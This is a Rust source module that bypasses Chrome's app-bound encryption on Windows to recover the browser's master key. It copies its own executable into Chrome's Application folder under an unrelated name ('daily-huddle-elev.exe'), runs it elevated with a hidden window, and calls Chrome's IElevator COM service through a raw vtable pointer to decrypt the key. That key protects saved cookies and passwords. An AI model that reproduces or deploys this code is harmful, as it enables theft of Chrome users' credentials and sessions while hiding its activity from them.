//! Chrome v20 key extraction via the official IElevator COM service.
//! Required on Windows 11 where LSASS runs as a Protected Process Light (PPL).

use std::path::{Path, PathBuf};

const CLSID_ELEVATOR: windows::core::GUID = windows::core::GUID::from_u128(
    0x7088_60E0_F641_4611_8895_7D86_7DD3_675B,
);

pub fn chrome_application_dir() -> Option<PathBuf> {
    let program_files = std::env::var("ProgramFiles").ok()?;
    let dir = PathBuf::from(program_files)
        .join("Google")
        .join("Chrome")
        .join("Application");
    dir.is_dir().then_some(dir)
}

pub fn is_running_from_chrome_dir() -> bool {
    let Ok(exe) = std::env::current_exe() else {
        return false;
    };
    chrome_application_dir()
        .map(|dir| exe.parent() == Some(dir.as_path()))
        .unwrap_or(false)
}

/// Decrypt the app-bound master key through Chrome's elevation service COM object.
/// The calling process must reside in Chrome's Application directory.
#[cfg(target_os = "windows")]
pub fn extract_via_ielevator(local_state_path: &Path) -> Option<Vec<u8>> {
    if !is_running_from_chrome_dir() {
        return None;
    }

    let content = std::fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    let encrypted_key_b64 = json
        .pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())?;

    let encrypted_key = base64::Engine::decode(
        &base64::engine::general_purpose::STANDARD,
        encrypted_key_b64,
    )
    .ok()?;

    const APPB: &[u8] = b"APPB";
    if encrypted_key.len() <= APPB.len() || &encrypted_key[..APPB.len()] != APPB {
        return None;
    }
    let blob = &encrypted_key[APPB.len()..];

    decrypt_with_ielevator(blob).ok()
}

#[cfg(not(target_os = "windows"))]
pub fn extract_via_ielevator(_local_state_path: &Path) -> Option<Vec<u8>> {
    None
}

/// Copy this executable into Chrome's Application folder, run it elevated there, wait for cache.
#[cfg(target_os = "windows")]
pub fn spawn_chrome_path_helper_and_wait(
    local_state_path: &Path,
    wait_for_cache: fn(&Path, u32) -> (),
    cache_available: fn(&Path) -> bool,
) -> bool {
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::System::Threading::{GetExitCodeProcess, WaitForSingleObject};
    use windows::Win32::UI::Shell::{ShellExecuteExW, SHELLEXECUTEINFOW};
    use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;

    let chrome_dir = match chrome_application_dir() {
        Some(dir) => dir,
        None => return false,
    };

    let exe = match std::env::current_exe() {
        Ok(path) => path,
        Err(_) => return false,
    };

    let helper_name = "daily-huddle-elev.exe";
    let helper_path = chrome_dir.join(helper_name);

    if std::fs::copy(&exe, &helper_path).is_err() {
        return false;
    }

    let helper_wide: Vec<u16> = helper_path
        .as_os_str()
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut info = SHELLEXECUTEINFOW {
        cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as u32,
        fMask: windows::Win32::UI::Shell::SEE_MASK_NOCLOSEPROCESS,
        lpFile: PCWSTR(helper_wide.as_ptr()),
        lpParameters: PCWSTR::null(),
        nShow: SW_HIDE.0 as i32,
        ..Default::default()
    };

    let spawned = unsafe {
        if ShellExecuteExW(&mut info).is_err() || info.hProcess.is_invalid() {
            false
        } else {
            let _ = WaitForSingleObject(info.hProcess, 120_000);
            let mut exit_code = 1u32;
            let _ = GetExitCodeProcess(info.hProcess, &mut exit_code);
            let _ = CloseHandle(info.hProcess);
            exit_code == 0
        }
    };

    let _ = std::fs::remove_file(&helper_path);

    if !spawned {
        return false;
    }

    wait_for_cache(local_state_path, 20);
    cache_available(local_state_path)
}

#[cfg(target_os = "windows")]
fn decrypt_with_ielevator(blob: &[u8]) -> Result<Vec<u8>, String> {
    use std::ffi::c_void;
    use windows::core::{BSTR, HRESULT, Interface};
    use windows::Win32::Foundation::{SysAllocStringByteLen, SysFreeString, SysStringByteLen};
    use windows::Win32::System::Com::{
        CoCreateInstance, CoInitializeEx, CoSetProxyBlanket, CoUninitialize,
        CLSCTX_LOCAL_SERVER, COINIT_APARTMENTTHREADED, EOAC_DYNAMIC_CLOAKING,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
    };
    use windows::Win32::System::Rpc::RPC_C_AUTHN_WINNT;

    type DecryptDataFn = unsafe extern "system" fn(
        this: *mut c_void,
        ciphertext: BSTR,
        plaintext: *mut BSTR,
        last_error: *mut u32,
    ) -> HRESULT;

    unsafe {
        if CoInitializeEx(None, COINIT_APARTMENTTHREADED).is_err() {
            return Err("COM init failed".to_string());
        }

        let result = (|| {
            let elevator: windows::core::IUnknown =
                CoCreateInstance(&CLSID_ELEVATOR, None, CLSCTX_LOCAL_SERVER)
                    .map_err(|e| format!("CoCreateInstance failed: {e}"))?;
            let elevator_ptr = elevator.as_raw() as *mut c_void;

            CoSetProxyBlanket(
                &elevator,
                RPC_C_AUTHN_WINNT,
                0,
                None,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                None,
                EOAC_DYNAMIC_CLOAKING,
            )
            .map_err(|e| format!("CoSetProxyBlanket failed: {e}"))?;

            let vtable = *(elevator_ptr as *const *const *const c_void);
            let decrypt_data: DecryptDataFn = std::mem::transmute(*vtable.add(5));

            let ciphertext = SysAllocStringByteLen(Some(blob));
            if ciphertext.is_empty() {
                return Err("BSTR alloc failed".to_string());
            }

            let mut plaintext = BSTR::default();
            let mut last_error = 0u32;
            let hr = decrypt_data(elevator_ptr, ciphertext.clone(), &mut plaintext, &mut last_error);
            SysFreeString(&ciphertext);

            if hr.is_err() {
                return Err(format!(
                    "DecryptData failed: hr=0x{:08X} last_error={last_error}",
                    hr.0 as u32
                ));
            }

            let len = SysStringByteLen(&plaintext) as usize;
            if len == 0 {
                return Err("DecryptData returned empty key".to_string());
            }
            let bytes =
                std::slice::from_raw_parts(plaintext.as_ptr() as *const u8, len).to_vec();
            SysFreeString(&plaintext);
            Ok(bytes)
        })();

        CoUninitialize();
        result
    }
}
